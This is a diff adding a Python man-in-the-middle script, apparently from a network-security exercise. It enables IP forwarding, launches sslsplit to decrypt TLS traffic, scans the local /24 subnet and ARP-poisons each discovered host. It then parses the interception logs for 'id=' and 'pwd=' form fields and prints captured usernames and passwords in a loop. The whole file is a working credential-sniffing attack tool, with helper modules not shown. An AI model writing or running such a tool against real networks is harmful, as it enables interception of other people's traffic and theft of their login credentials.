@@ -1,0 +1,80 @@
+#!/usr/bin/python3
+
+import socket, struct, os, sys, time
+import subprocess, re, fcntl
+from urllib.parse import unquote
+from scapy.all import *
+from machine import *
+from utils import *
+
+if __name__ == "__main__":
+    print("(ﾟ皿ﾟﾒ) (ﾟ皿ﾟﾒ) (MITM) (#`皿´) (#`皿´)")
+    args = sys.argv
+    if len(args) > 1:
+        for arg in args:
+            if arg == "-h" or arg == "--help":
+                print("[-] no help, byebye :)")
+                exit(1)
+            elif arg[0:2] == "-i":
+                interval=int(arg[2:len(arg)])
+                
+    print("[*] set up ip forwarding")
+    enable_port_forwarding()
+    sslsplit()
+    
+    gateway = machine(conf.route.route("0.0.0.0")[2])
+    myself = machine(get_if_addr(conf.iface), Ether().src)
+    mach_list = []
+
+    print("[*] gateway: %s \t(%s)" % (gateway.ip, gateway.mac))
+    print("[*] myself: %s \t(%s)" % (myself.ip, myself.mac))
+    
+    #hosts discovery
+    net_range = myself.ip+"/24"
+    print("[*] discovering machines in (%s)" % net_range)
+    for ip in scan_hosts(net_range):
+        if ip != gateway.ip and ip != myself.ip:
+            mach = machine(ip=ip, gw=gateway)
+            mach_list.append(mach)
+            print("[*] discovered %s \t(%s)" % (ip, mach.mac))
+
+    #exploit
+    idle = False
+    prev_ans = set()
+    ans = set()
+    try:
+        while(True):
+            print("[~] poisoning machines")
+            idle = False
+            for mach in mach_list:
+                mach.mitm_poison(myself)
+            idle = True
+
+            potential_ans = []
+            # get all username and password in log file
+            for file in os.listdir("logdir/"):
+                with open("logdir/" + file, 'r', encoding='utf-8', errors='ignore') as f:
+                    for line in f:
+                        if ("id=" in line) and ("pwd=" in line):
+                            potential_ans = re.findall("id=(.*?)&pwd=(.*?)&recaptchaToken=", line)
+                            if(potential_ans != []):
+                                (username, passwd) = potential_ans[0]
+                                ans.add((username,passwd))
+
+            newuser = ans - prev_ans
+            for user in newuser:
+                print("[&] login request sniffed: (username=%s,password=%s)" % (user[0], user[1]))
+
+            prev_ans = ans.copy()
+
+            time.sleep(interval)
+    except KeyboardInterrupt:
+        if not idle: print()
+        print("\r[!] interrupted")
+        disable_port_forwarding()
+        print("[~] restore: ", end="")
+        for mach in mach_list:
+            mach.mitm_restore()
+            print(mach.ip, end=" ")
+        print()
+        exit(1)
